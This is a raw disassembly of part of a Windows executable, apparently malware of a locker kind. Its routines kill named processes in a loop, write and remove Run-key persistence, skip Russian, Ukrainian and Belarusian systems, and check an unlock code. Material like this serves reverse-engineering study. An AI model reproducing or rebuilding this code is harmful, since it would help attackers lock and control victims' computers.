  401758:	8d 44 24 14          	lea    0x14(%esp),%eax
  40175c:	50                   	push   %eax
  40175d:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  401761:	51                   	push   %ecx
  401762:	57                   	push   %edi
  401763:	ff 15 20 31 40 00    	call   *0x403120
  401769:	8b 1d 60 30 40 00    	mov    0x403060,%ebx
  40176f:	85 c0                	test   %eax,%eax
  401771:	74 38                	je     0x4017ab
  401773:	6a 00                	push   $0x0
  401775:	68 00 00 00 02       	push   $0x2000000
  40177a:	6a 03                	push   $0x3
  40177c:	6a 00                	push   $0x0
  40177e:	6a 03                	push   $0x3
  401780:	68 00 00 00 40       	push   $0x40000000
  401785:	68 40 61 40 00       	push   $0x406140
  40178a:	ff d6                	call   *%esi
  40178c:	8b f0                	mov    %eax,%esi
  40178e:	85 f6                	test   %esi,%esi
  401790:	74 19                	je     0x4017ab
  401792:	8d 54 24 20          	lea    0x20(%esp),%edx
  401796:	52                   	push   %edx
  401797:	8d 44 24 14          	lea    0x14(%esp),%eax
  40179b:	50                   	push   %eax
  40179c:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  4017a0:	51                   	push   %ecx
  4017a1:	56                   	push   %esi
  4017a2:	ff 15 ac 30 40 00    	call   *0x4030ac
  4017a8:	56                   	push   %esi
  4017a9:	ff d3                	call   *%ebx
  4017ab:	57                   	push   %edi
  4017ac:	ff d3                	call   *%ebx
  4017ae:	5f                   	pop    %edi
  4017af:	5e                   	pop    %esi
  4017b0:	5b                   	pop    %ebx
  4017b1:	81 c4 20 02 00 00    	add    $0x220,%esp
  4017b7:	c3                   	ret
  4017b8:	cc                   	int3
  4017b9:	cc                   	int3
  4017ba:	cc                   	int3
  4017bb:	cc                   	int3
  4017bc:	cc                   	int3
  4017bd:	cc                   	int3
  4017be:	cc                   	int3
  4017bf:	cc                   	int3
  4017c0:	81 ec 00 04 00 00    	sub    $0x400,%esp
  4017c6:	68 40 61 40 00       	push   $0x406140
  4017cb:	8d 44 24 04          	lea    0x4(%esp),%eax
  4017cf:	68 14 34 40 00       	push   $0x403414
  4017d4:	50                   	push   %eax
  4017d5:	ff 15 44 31 40 00    	call   *0x403144
  4017db:	83 c4 0c             	add    $0xc,%esp
  4017de:	6a 00                	push   $0x0
  4017e0:	6a 00                	push   $0x0
  4017e2:	6a 03                	push   $0x3
  4017e4:	6a 00                	push   $0x0
  4017e6:	6a 00                	push   $0x0
  4017e8:	68 00 00 00 80       	push   $0x80000000
  4017ed:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  4017f1:	51                   	push   %ecx
  4017f2:	ff 15 d8 30 40 00    	call   *0x4030d8
  4017f8:	83 f8 ff             	cmp    $0xffffffff,%eax
  4017fb:	74 11                	je     0x40180e
  4017fd:	50                   	push   %eax
  4017fe:	ff 15 60 30 40 00    	call   *0x403060
  401804:	8d 14 24             	lea    (%esp),%edx
  401807:	52                   	push   %edx
  401808:	ff 15 5c 30 40 00    	call   *0x40305c
  40180e:	81 c4 00 04 00 00    	add    $0x400,%esp
  401814:	c3                   	ret
  401815:	cc                   	int3
  401816:	cc                   	int3
  401817:	cc                   	int3
  401818:	cc                   	int3
  401819:	cc                   	int3
  40181a:	cc                   	int3
  40181b:	cc                   	int3
  40181c:	cc                   	int3
  40181d:	cc                   	int3
  40181e:	cc                   	int3
  40181f:	cc                   	int3
  401820:	81 ec 30 02 00 00    	sub    $0x230,%esp
  401826:	53                   	push   %ebx
  401827:	8b 1d 60 30 40 00    	mov    0x403060,%ebx
  40182d:	55                   	push   %ebp
  40182e:	8b 2d cc 30 40 00    	mov    0x4030cc,%ebp
  401834:	56                   	push   %esi
  401835:	57                   	push   %edi
  401836:	8b 3d b4 30 40 00    	mov    0x4030b4,%edi
  40183c:	8d 64 24 00          	lea    0x0(%esp),%esp
  401840:	6a 64                	push   $0x64
  401842:	ff 15 bc 30 40 00    	call   *0x4030bc
  401848:	6a 00                	push   $0x0
  40184a:	6a 02                	push   $0x2
  40184c:	c7 44 24 1c 2c 02 00 	movl   $0x22c,0x1c(%esp)
  401853:	00 
  401854:	e8 5f 0b 00 00       	call   0x4023b8
  401859:	8b f0                	mov    %eax,%esi
  40185b:	8d 44 24 14          	lea    0x14(%esp),%eax
  40185f:	50                   	push   %eax
  401860:	56                   	push   %esi
  401861:	89 74 24 18          	mov    %esi,0x18(%esp)
  401865:	e8 42 0b 00 00       	call   0x4023ac
  40186a:	83 f8 01             	cmp    $0x1,%eax
  40186d:	0f 85 11 01 00 00    	jne    0x401984
  401873:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  401877:	51                   	push   %ecx
  401878:	56                   	push   %esi
  401879:	e8 34 0b 00 00       	call   0x4023b2
  40187e:	83 f8 01             	cmp    $0x1,%eax
  401881:	0f 85 fd 00 00 00    	jne    0x401984
  401887:	eb 07                	jmp    0x401890
  401889:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  401890:	8d 54 24 38          	lea    0x38(%esp),%edx
  401894:	52                   	push   %edx
  401895:	68 3c 34 40 00       	push   $0x40343c
  40189a:	ff 15 18 31 40 00    	call   *0x403118
  4018a0:	85 c0                	test   %eax,%eax
  4018a2:	75 23                	jne    0x4018c7
  4018a4:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  4018a8:	ff 15 58 30 40 00    	call   *0x403058
  4018ae:	3b f0                	cmp    %eax,%esi
  4018b0:	74 15                	je     0x4018c7
  4018b2:	56                   	push   %esi
  4018b3:	6a 00                	push   $0x0
  4018b5:	6a 01                	push   $0x1
  4018b7:	ff d7                	call   *%edi
  4018b9:	8b f0                	mov    %eax,%esi
  4018bb:	85 f6                	test   %esi,%esi
  4018bd:	74 08                	je     0x4018c7
  4018bf:	6a 00                	push   $0x0
  4018c1:	56                   	push   %esi
  4018c2:	ff d5                	call   *%ebp
  4018c4:	56                   	push   %esi
  4018c5:	ff d3                	call   *%ebx
  4018c7:	8d 44 24 38          	lea    0x38(%esp),%eax
  4018cb:	50                   	push   %eax
  4018cc:	68 54 34 40 00       	push   $0x403454
  4018d1:	ff 15 18 31 40 00    	call   *0x403118
  4018d7:	85 c0                	test   %eax,%eax
  4018d9:	75 23                	jne    0x4018fe
  4018db:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  4018df:	ff 15 58 30 40 00    	call   *0x403058
  4018e5:	3b f0                	cmp    %eax,%esi
  4018e7:	74 15                	je     0x4018fe
  4018e9:	56                   	push   %esi
  4018ea:	6a 00                	push   $0x0
  4018ec:	6a 01                	push   $0x1
  4018ee:	ff d7                	call   *%edi
  4018f0:	8b f0                	mov    %eax,%esi
  4018f2:	85 f6                	test   %esi,%esi
  4018f4:	74 08                	je     0x4018fe
  4018f6:	6a 00                	push   $0x0
  4018f8:	56                   	push   %esi
  4018f9:	ff d5                	call   *%ebp
  4018fb:	56                   	push   %esi
  4018fc:	ff d3                	call   *%ebx
  4018fe:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401902:	51                   	push   %ecx
  401903:	68 6c 34 40 00       	push   $0x40346c
  401908:	ff 15 18 31 40 00    	call   *0x403118
  40190e:	85 c0                	test   %eax,%eax
  401910:	75 23                	jne    0x401935
  401912:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  401916:	ff 15 58 30 40 00    	call   *0x403058
  40191c:	3b f0                	cmp    %eax,%esi
  40191e:	74 15                	je     0x401935
  401920:	56                   	push   %esi
  401921:	6a 00                	push   $0x0
  401923:	6a 01                	push   $0x1
  401925:	ff d7                	call   *%edi
  401927:	8b f0                	mov    %eax,%esi
  401929:	85 f6                	test   %esi,%esi
  40192b:	74 08                	je     0x401935
  40192d:	6a 00                	push   $0x0
  40192f:	56                   	push   %esi
  401930:	ff d5                	call   *%ebp
  401932:	56                   	push   %esi
  401933:	ff d3                	call   *%ebx
  401935:	8d 54 24 38          	lea    0x38(%esp),%edx
  401939:	52                   	push   %edx
  40193a:	68 88 34 40 00       	push   $0x403488
  40193f:	ff 15 18 31 40 00    	call   *0x403118
  401945:	85 c0                	test   %eax,%eax
  401947:	75 23                	jne    0x40196c
  401949:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  40194d:	ff 15 58 30 40 00    	call   *0x403058
  401953:	3b f0                	cmp    %eax,%esi
  401955:	74 15                	je     0x40196c
  401957:	56                   	push   %esi
  401958:	6a 00                	push   $0x0
  40195a:	6a 01                	push   $0x1
  40195c:	ff d7                	call   *%edi
  40195e:	8b f0                	mov    %eax,%esi
  401960:	85 f6                	test   %esi,%esi
  401962:	74 08                	je     0x40196c
  401964:	6a 00                	push   $0x0
  401966:	56                   	push   %esi
  401967:	ff d5                	call   *%ebp
  401969:	56                   	push   %esi
  40196a:	ff d3                	call   *%ebx
  40196c:	8b 74 24 10          	mov    0x10(%esp),%esi
  401970:	8d 44 24 14          	lea    0x14(%esp),%eax
  401974:	50                   	push   %eax
  401975:	56                   	push   %esi
  401976:	e8 37 0a 00 00       	call   0x4023b2
  40197b:	83 f8 01             	cmp    $0x1,%eax
  40197e:	0f 84 0c ff ff ff    	je     0x401890
  401984:	56                   	push   %esi
  401985:	ff d3                	call   *%ebx
  401987:	e9 b4 fe ff ff       	jmp    0x401840
  40198c:	cc                   	int3
  40198d:	cc                   	int3
  40198e:	cc                   	int3
  40198f:	cc                   	int3
  401990:	83 ec 10             	sub    $0x10,%esp
  401993:	56                   	push   %esi
  401994:	57                   	push   %edi
  401995:	6a 04                	push   $0x4
  401997:	68 00 10 00 00       	push   $0x1000
  40199c:	6a 04                	push   $0x4
  40199e:	6a 00                	push   $0x0
  4019a0:	ff 15 f4 30 40 00    	call   *0x4030f4
  4019a6:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4019aa:	8b 54 24 20          	mov    0x20(%esp),%edx
  4019ae:	8b f0                	mov    %eax,%esi
  4019b0:	8d 44 24 08          	lea    0x8(%esp),%eax
  4019b4:	50                   	push   %eax
  4019b5:	8b 44 24 20          	mov    0x20(%esp),%eax
  4019b9:	56                   	push   %esi
  4019ba:	6a 00                	push   $0x0
  4019bc:	6a 00                	push   $0x0
  4019be:	51                   	push   %ecx
  4019bf:	6a 00                	push   $0x0
  4019c1:	6a 00                	push   $0x0
  4019c3:	6a 00                	push   $0x0
  4019c5:	52                   	push   %edx
  4019c6:	50                   	push   %eax
  4019c7:	ff 15 94 30 40 00    	call   *0x403094
  4019cd:	83 f8 01             	cmp    $0x1,%eax
  4019d0:	75 1b                	jne    0x4019ed
  4019d2:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4019d6:	8b 3d 60 30 40 00    	mov    0x403060,%edi
  4019dc:	51                   	push   %ecx
  4019dd:	ff d7                	call   *%edi
  4019df:	8b 54 24 08          	mov    0x8(%esp),%edx
  4019e3:	52                   	push   %edx
  4019e4:	ff d7                	call   *%edi
  4019e6:	bf 01 00 00 00       	mov    $0x1,%edi
  4019eb:	eb 02                	jmp    0x4019ef
  4019ed:	33 ff                	xor    %edi,%edi
  4019ef:	68 00 80 00 00       	push   $0x8000
  4019f4:	6a 00                	push   $0x0
  4019f6:	56                   	push   %esi
  4019f7:	ff 15 a8 30 40 00    	call   *0x4030a8
  4019fd:	8b c7                	mov    %edi,%eax
  4019ff:	5f                   	pop    %edi
  401a00:	5e                   	pop    %esi
  401a01:	83 c4 10             	add    $0x10,%esp
  401a04:	c3                   	ret
  401a05:	cc                   	int3
  401a06:	cc                   	int3
  401a07:	cc                   	int3
  401a08:	cc                   	int3
  401a09:	cc                   	int3
  401a0a:	cc                   	int3
  401a0b:	cc                   	int3
  401a0c:	cc                   	int3
  401a0d:	cc                   	int3
  401a0e:	cc                   	int3
  401a0f:	cc                   	int3
  401a10:	81 ec 04 06 00 00    	sub    $0x604,%esp
  401a16:	68 04 01 00 00       	push   $0x104
  401a1b:	8d 44 24 04          	lea    0x4(%esp),%eax
  401a1f:	50                   	push   %eax
  401a20:	68 98 34 40 00       	push   $0x403498
  401a25:	ff 15 48 30 40 00    	call   *0x403048
  401a2b:	68 e0 34 40 00       	push   $0x4034e0
  401a30:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401a34:	51                   	push   %ecx
  401a35:	8d 94 24 08 02 00 00 	lea    0x208(%esp),%edx
  401a3c:	68 6c 35 40 00       	push   $0x40356c
  401a41:	52                   	push   %edx
  401a42:	ff 15 44 31 40 00    	call   *0x403144
  401a48:	68 00 00 00 08       	push   $0x8000000
  401a4d:	8d 84 24 14 02 00 00 	lea    0x214(%esp),%eax
  401a54:	50                   	push   %eax
  401a55:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  401a59:	51                   	push   %ecx
  401a5a:	e8 31 ff ff ff       	call   0x401990
  401a5f:	81 c4 20 06 00 00    	add    $0x620,%esp
  401a65:	c3                   	ret
  401a66:	cc                   	int3
  401a67:	cc                   	int3
  401a68:	cc                   	int3
  401a69:	cc                   	int3
  401a6a:	cc                   	int3
  401a6b:	cc                   	int3
  401a6c:	cc                   	int3
  401a6d:	cc                   	int3
  401a6e:	cc                   	int3
  401a6f:	cc                   	int3
  401a70:	81 ec 04 06 00 00    	sub    $0x604,%esp
  401a76:	68 04 01 00 00       	push   $0x104
  401a7b:	8d 44 24 04          	lea    0x4(%esp),%eax
  401a7f:	50                   	push   %eax
  401a80:	68 98 34 40 00       	push   $0x403498
  401a85:	ff 15 48 30 40 00    	call   *0x403048
  401a8b:	68 78 35 40 00       	push   $0x403578
  401a90:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401a94:	51                   	push   %ecx
  401a95:	8d 94 24 08 02 00 00 	lea    0x208(%esp),%edx
  401a9c:	68 6c 35 40 00       	push   $0x40356c
  401aa1:	52                   	push   %edx
  401aa2:	ff 15 44 31 40 00    	call   *0x403144
  401aa8:	68 00 00 00 08       	push   $0x8000000
  401aad:	8d 84 24 14 02 00 00 	lea    0x214(%esp),%eax
  401ab4:	50                   	push   %eax
  401ab5:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  401ab9:	51                   	push   %ecx
  401aba:	e8 d1 fe ff ff       	call   0x401990
  401abf:	81 c4 20 06 00 00    	add    $0x620,%esp
  401ac5:	c3                   	ret
  401ac6:	cc                   	int3
  401ac7:	cc                   	int3
  401ac8:	cc                   	int3
  401ac9:	cc                   	int3
  401aca:	cc                   	int3
  401acb:	cc                   	int3
  401acc:	cc                   	int3
  401acd:	cc                   	int3
  401ace:	cc                   	int3
  401acf:	cc                   	int3
  401ad0:	51                   	push   %ecx
  401ad1:	53                   	push   %ebx
  401ad2:	55                   	push   %ebp
  401ad3:	56                   	push   %esi
  401ad4:	8b 35 18 30 40 00    	mov    0x403018,%esi
  401ada:	57                   	push   %edi
  401adb:	8d 44 24 10          	lea    0x10(%esp),%eax
  401adf:	50                   	push   %eax
  401ae0:	68 e0 35 40 00       	push   $0x4035e0
  401ae5:	68 01 00 00 80       	push   $0x80000001
  401aea:	ff d6                	call   *%esi
  401aec:	8b 3d e8 30 40 00    	mov    0x4030e8,%edi
  401af2:	68 40 61 40 00       	push   $0x406140
  401af7:	ff d7                	call   *%edi
  401af9:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401afd:	8b 1d 08 30 40 00    	mov    0x403008,%ebx
  401b03:	03 c0                	add    %eax,%eax
  401b05:	50                   	push   %eax
  401b06:	68 40 61 40 00       	push   $0x406140
  401b0b:	6a 01                	push   $0x1
  401b0d:	6a 00                	push   $0x0
  401b0f:	68 ac 32 40 00       	push   $0x4032ac
  401b14:	51                   	push   %ecx
  401b15:	ff d3                	call   *%ebx
  401b17:	8b 54 24 10          	mov    0x10(%esp),%edx
  401b1b:	8b 2d 0c 30 40 00    	mov    0x40300c,%ebp
  401b21:	52                   	push   %edx
  401b22:	ff d5                	call   *%ebp
  401b24:	8d 44 24 10          	lea    0x10(%esp),%eax
  401b28:	50                   	push   %eax
  401b29:	68 e0 35 40 00       	push   $0x4035e0
  401b2e:	68 02 00 00 80       	push   $0x80000002
  401b33:	ff d6                	call   *%esi
  401b35:	68 40 61 40 00       	push   $0x406140
  401b3a:	ff d7                	call   *%edi
  401b3c:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401b40:	03 c0                	add    %eax,%eax
  401b42:	50                   	push   %eax
  401b43:	68 40 61 40 00       	push   $0x406140
  401b48:	6a 01                	push   $0x1
  401b4a:	6a 00                	push   $0x0
  401b4c:	68 ac 32 40 00       	push   $0x4032ac
  401b51:	51                   	push   %ecx
  401b52:	ff d3                	call   *%ebx
  401b54:	8b 54 24 10          	mov    0x10(%esp),%edx
  401b58:	52                   	push   %edx
  401b59:	ff d5                	call   *%ebp
  401b5b:	5f                   	pop    %edi
  401b5c:	5e                   	pop    %esi
  401b5d:	5d                   	pop    %ebp
  401b5e:	5b                   	pop    %ebx
  401b5f:	59                   	pop    %ecx
  401b60:	c3                   	ret
  401b61:	cc                   	int3
  401b62:	cc                   	int3
  401b63:	cc                   	int3
  401b64:	cc                   	int3
  401b65:	cc                   	int3
  401b66:	cc                   	int3
  401b67:	cc                   	int3
  401b68:	cc                   	int3
  401b69:	cc                   	int3
  401b6a:	cc                   	int3
  401b6b:	cc                   	int3
  401b6c:	cc                   	int3
  401b6d:	cc                   	int3
  401b6e:	cc                   	int3
  401b6f:	cc                   	int3
  401b70:	51                   	push   %ecx
  401b71:	53                   	push   %ebx
  401b72:	56                   	push   %esi
  401b73:	8b 35 00 30 40 00    	mov    0x403000,%esi
  401b79:	57                   	push   %edi
  401b7a:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401b7e:	50                   	push   %eax
  401b7f:	68 e0 35 40 00       	push   $0x4035e0
  401b84:	68 01 00 00 80       	push   $0x80000001
  401b89:	ff d6                	call   *%esi
  401b8b:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  401b8f:	8b 3d 20 30 40 00    	mov    0x403020,%edi
  401b95:	68 ac 32 40 00       	push   $0x4032ac
  401b9a:	51                   	push   %ecx
  401b9b:	ff d7                	call   *%edi
  401b9d:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401ba1:	8b 1d 0c 30 40 00    	mov    0x40300c,%ebx
  401ba7:	52                   	push   %edx
  401ba8:	ff d3                	call   *%ebx
  401baa:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401bae:	50                   	push   %eax
  401baf:	68 e0 35 40 00       	push   $0x4035e0
  401bb4:	68 02 00 00 80       	push   $0x80000002
  401bb9:	ff d6                	call   *%esi
  401bbb:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  401bbf:	68 ac 32 40 00       	push   $0x4032ac
  401bc4:	51                   	push   %ecx
  401bc5:	ff d7                	call   *%edi
  401bc7:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401bcb:	52                   	push   %edx
  401bcc:	ff d3                	call   *%ebx
  401bce:	5f                   	pop    %edi
  401bcf:	5e                   	pop    %esi
  401bd0:	5b                   	pop    %ebx
  401bd1:	59                   	pop    %ecx
  401bd2:	c3                   	ret
  401bd3:	cc                   	int3
  401bd4:	cc                   	int3
  401bd5:	cc                   	int3
  401bd6:	cc                   	int3
  401bd7:	cc                   	int3
  401bd8:	cc                   	int3
  401bd9:	cc                   	int3
  401bda:	cc                   	int3
  401bdb:	cc                   	int3
  401bdc:	cc                   	int3
  401bdd:	cc                   	int3
  401bde:	cc                   	int3
  401bdf:	cc                   	int3
  401be0:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401be4:	81 ec 08 06 00 00    	sub    $0x608,%esp
  401bea:	8b c1                	mov    %ecx,%eax
  401bec:	83 e8 02             	sub    $0x2,%eax
  401bef:	56                   	push   %esi
  401bf0:	0f 84 20 01 00 00    	je     0x401d16
  401bf6:	2d 0f 01 00 00       	sub    $0x10f,%eax
  401bfb:	74 29                	je     0x401c26
  401bfd:	8b 84 24 1c 06 00 00 	mov    0x61c(%esp),%eax
  401c04:	8b 94 24 18 06 00 00 	mov    0x618(%esp),%edx
  401c0b:	50                   	push   %eax
  401c0c:	8b 84 24 14 06 00 00 	mov    0x614(%esp),%eax
  401c13:	52                   	push   %edx
  401c14:	51                   	push   %ecx
  401c15:	50                   	push   %eax
  401c16:	ff 15 50 31 40 00    	call   *0x403150
  401c1c:	5e                   	pop    %esi
  401c1d:	81 c4 08 06 00 00    	add    $0x608,%esp
  401c23:	c2 10 00             	ret    $0x10
  401c26:	8b 8c 24 18 06 00 00 	mov    0x618(%esp),%ecx
  401c2d:	c1 e9 10             	shr    $0x10,%ecx
  401c30:	85 c9                	test   %ecx,%ecx
  401c32:	0f 85 e6 00 00 00    	jne    0x401d1e
  401c38:	a1 20 61 40 00       	mov    0x406120,%eax
  401c3d:	68 ff 00 00 00       	push   $0xff
  401c42:	8d 54 24 0c          	lea    0xc(%esp),%edx
  401c46:	52                   	push   %edx
  401c47:	50                   	push   %eax
  401c48:	ff 15 78 31 40 00    	call   *0x403178
  401c4e:	83 3d 80 56 40 00 00 	cmpl   $0x0,0x405680
  401c55:	75 4f                	jne    0x401ca6
  401c57:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401c5b:	51                   	push   %ecx
  401c5c:	ff 15 e8 30 40 00    	call   *0x4030e8
  401c62:	85 c0                	test   %eax,%eax
  401c64:	0f 84 b4 00 00 00    	je     0x401d1e
  401c6a:	8d 54 24 08          	lea    0x8(%esp),%edx
  401c6e:	52                   	push   %edx
  401c6f:	68 60 50 40 00       	push   $0x405060
  401c74:	8d 84 24 10 02 00 00 	lea    0x210(%esp),%eax
  401c7b:	68 3c 36 40 00       	push   $0x40363c
  401c80:	50                   	push   %eax
  401c81:	ff 15 44 31 40 00    	call   *0x403144
  401c87:	6a 00                	push   $0x0
  401c89:	8d 8c 24 1c 02 00 00 	lea    0x21c(%esp),%ecx
  401c90:	51                   	push   %ecx
  401c91:	68 40 61 40 00       	push   $0x406140
  401c96:	e8 f5 fc ff ff       	call   0x401990
  401c9b:	83 c4 1c             	add    $0x1c,%esp
  401c9e:	6a 00                	push   $0x0
  401ca0:	ff 15 68 30 40 00    	call   *0x403068
  401ca6:	8b 35 e8 30 40 00    	mov    0x4030e8,%esi
  401cac:	8d 54 24 08          	lea    0x8(%esp),%edx
  401cb0:	52                   	push   %edx
  401cb1:	ff d6                	call   *%esi
  401cb3:	85 c0                	test   %eax,%eax
  401cb5:	74 67                	je     0x401d1e
  401cb7:	8d 44 24 08          	lea    0x8(%esp),%eax
  401cbb:	50                   	push   %eax
  401cbc:	ff d6                	call   *%esi
  401cbe:	03 c0                	add    %eax,%eax
  401cc0:	50                   	push   %eax
  401cc1:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401cc5:	51                   	push   %ecx
  401cc6:	6a 00                	push   $0x0
  401cc8:	ff 15 60 54 40 00    	call   *0x405460
  401cce:	3d 2a 70 a1 27       	cmp    $0x27a1702a,%eax
  401cd3:	75 21                	jne    0x401cf6
  401cd5:	8b 15 84 56 40 00    	mov    0x405684,%edx
  401cdb:	6a 00                	push   $0x0
  401cdd:	52                   	push   %edx
  401cde:	ff 15 b8 30 40 00    	call   *0x4030b8
  401ce4:	e8 87 fd ff ff       	call   0x401a70
  401ce9:	e8 82 fe ff ff       	call   0x401b70
  401cee:	6a 00                	push   $0x0
  401cf0:	ff 15 68 30 40 00    	call   *0x403068
  401cf6:	6a 10                	push   $0x10
  401cf8:	68 4c 36 40 00       	push   $0x40364c
  401cfd:	68 58 36 40 00       	push   $0x403658
  401d02:	6a 00                	push   $0x0
  401d04:	ff 15 64 31 40 00    	call   *0x403164
  401d0a:	33 c0                	xor    %eax,%eax
  401d0c:	5e                   	pop    %esi
  401d0d:	81 c4 08 06 00 00    	add    $0x608,%esp
  401d13:	c2 10 00             	ret    $0x10
  401d16:	6a 00                	push   $0x0
  401d18:	ff 15 3c 31 40 00    	call   *0x40313c
  401d1e:	33 c0                	xor    %eax,%eax
  401d20:	5e                   	pop    %esi
  401d21:	81 c4 08 06 00 00    	add    $0x608,%esp
  401d27:	c2 10 00             	ret    $0x10
  401d2a:	cc                   	int3
  401d2b:	cc                   	int3
  401d2c:	cc                   	int3
  401d2d:	cc                   	int3
  401d2e:	cc                   	int3
  401d2f:	cc                   	int3
  401d30:	83 ec 08             	sub    $0x8,%esp
  401d33:	53                   	push   %ebx
  401d34:	8b d8                	mov    %eax,%ebx
  401d36:	57                   	push   %edi
  401d37:	8d 44 24 08          	lea    0x8(%esp),%eax
  401d3b:	50                   	push   %eax
  401d3c:	53                   	push   %ebx
  401d3d:	e8 46 06 00 00       	call   0x402388
  401d42:	8b f8                	mov    %eax,%edi
  401d44:	85 ff                	test   %edi,%edi
  401d46:	74 79                	je     0x401dc1
  401d48:	56                   	push   %esi
  401d49:	6a 04                	push   $0x4
  401d4b:	68 00 10 00 00       	push   $0x1000
  401d50:	8d 0c 3f             	lea    (%edi,%edi,1),%ecx
  401d53:	51                   	push   %ecx
  401d54:	6a 00                	push   $0x0
  401d56:	ff 15 f4 30 40 00    	call   *0x4030f4
  401d5c:	8b f0                	mov    %eax,%esi
  401d5e:	56                   	push   %esi
  401d5f:	57                   	push   %edi
  401d60:	6a 00                	push   $0x0
  401d62:	53                   	push   %ebx
  401d63:	e8 14 06 00 00       	call   0x40237c
  401d68:	8d 54 24 10          	lea    0x10(%esp),%edx
  401d6c:	52                   	push   %edx
  401d6d:	68 40 50 40 00       	push   $0x405040
  401d72:	68 80 36 40 00       	push   $0x403680
  401d77:	56                   	push   %esi
  401d78:	e8 05 06 00 00       	call   0x402382
  401d7d:	6a 00                	push   $0x0
  401d7f:	68 40 61 40 00       	push   $0x406140
  401d84:	ff 15 f8 30 40 00    	call   *0x4030f8
  401d8a:	8b d8                	mov    %eax,%ebx
  401d8c:	a1 40 50 40 00       	mov    0x405040,%eax
  401d91:	0f b7 08             	movzwl (%eax),%ecx
  401d94:	57                   	push   %edi
  401d95:	56                   	push   %esi
  401d96:	51                   	push   %ecx
  401d97:	6a 01                	push   $0x1
  401d99:	6a 10                	push   $0x10
  401d9b:	53                   	push   %ebx
  401d9c:	ff 15 1c 31 40 00    	call   *0x40311c
  401da2:	6a 00                	push   $0x0
  401da4:	53                   	push   %ebx
  401da5:	ff 15 98 30 40 00    	call   *0x403098
  401dab:	68 00 80 00 00       	push   $0x8000
  401db0:	6a 00                	push   $0x0
  401db2:	56                   	push   %esi
  401db3:	ff 15 a8 30 40 00    	call   *0x4030a8
  401db9:	53                   	push   %ebx
  401dba:	ff 15 60 30 40 00    	call   *0x403060
  401dc0:	5e                   	pop    %esi
  401dc1:	5f                   	pop    %edi
  401dc2:	5b                   	pop    %ebx
  401dc3:	83 c4 08             	add    $0x8,%esp
  401dc6:	c3                   	ret
  401dc7:	cc                   	int3
  401dc8:	cc                   	int3
  401dc9:	cc                   	int3
  401dca:	cc                   	int3
  401dcb:	cc                   	int3
  401dcc:	cc                   	int3
  401dcd:	cc                   	int3
  401dce:	cc                   	int3
  401dcf:	cc                   	int3
  401dd0:	55                   	push   %ebp
  401dd1:	8b ec                	mov    %esp,%ebp
  401dd3:	83 e4 f8             	and    $0xfffffff8,%esp
  401dd6:	81 ec 5c 02 00 00    	sub    $0x25c,%esp
  401ddc:	53                   	push   %ebx
  401ddd:	56                   	push   %esi
  401dde:	57                   	push   %edi
  401ddf:	68 d0 07 00 00       	push   $0x7d0
  401de4:	ff 15 bc 30 40 00    	call   *0x4030bc
  401dea:	ff 15 64 30 40 00    	call   *0x403064
  401df0:	8b 3d a0 30 40 00    	mov    0x4030a0,%edi
  401df6:	68 b8 36 40 00       	push   $0x4036b8
  401dfb:	0f b7 f0             	movzwl %ax,%esi
  401dfe:	ff d7                	call   *%edi
  401e00:	68 28 37 40 00       	push   $0x403728
  401e05:	ff d7                	call   *%edi
  401e07:	68 64 37 40 00       	push   $0x403764
  401e0c:	33 db                	xor    %ebx,%ebx
  401e0e:	53                   	push   %ebx
  401e0f:	53                   	push   %ebx
  401e10:	ff 15 70 30 40 00    	call   *0x403070
  401e16:	ff 15 ec 30 40 00    	call   *0x4030ec
  401e1c:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401e21:	0f 84 4d 05 00 00    	je     0x402374
  401e27:	81 fe 19 04 00 00    	cmp    $0x419,%esi
  401e2d:	0f 84 41 05 00 00    	je     0x402374
  401e33:	81 fe 22 04 00 00    	cmp    $0x422,%esi
  401e39:	0f 84 35 05 00 00    	je     0x402374
  401e3f:	81 fe 23 04 00 00    	cmp    $0x423,%esi
  401e45:	0f 84 29 05 00 00    	je     0x402374
  401e4b:	68 8c 37 40 00       	push   $0x40378c
  401e50:	68 9c 37 40 00       	push   $0x40379c
  401e55:	ff 15 a4 30 40 00    	call   *0x4030a4
  401e5b:	50                   	push   %eax
  401e5c:	ff 15 f0 30 40 00    	call   *0x4030f0
  401e62:	68 00 02 00 00       	push   $0x200
  401e67:	68 60 50 40 00       	push   $0x405060
  401e6c:	53                   	push   %ebx
  401e6d:	a3 60 54 40 00       	mov    %eax,0x405460
  401e72:	ff 15 d4 30 40 00    	call   *0x4030d4
  401e78:	8b 35 48 30 40 00    	mov    0x403048,%esi
  401e7e:	68 00 02 00 00       	push   $0x200
  401e83:	68 40 61 40 00       	push   $0x406140
  401e88:	68 b0 37 40 00       	push   $0x4037b0
  401e8d:	ff d6                	call   *%esi
  401e8f:	68 40 61 40 00       	push   $0x406140
  401e94:	ff 15 c8 30 40 00    	call   *0x4030c8
  401e9a:	83 f8 ff             	cmp    $0xffffffff,%eax
  401e9d:	75 48                	jne    0x401ee7
  401e9f:	6a 01                	push   $0x1
  401ea1:	68 40 61 40 00       	push   $0x406140
  401ea6:	68 60 50 40 00       	push   $0x405060
  401eab:	ff 15 c0 30 40 00    	call   *0x4030c0
  401eb1:	e8 0a f9 ff ff       	call   0x4017c0
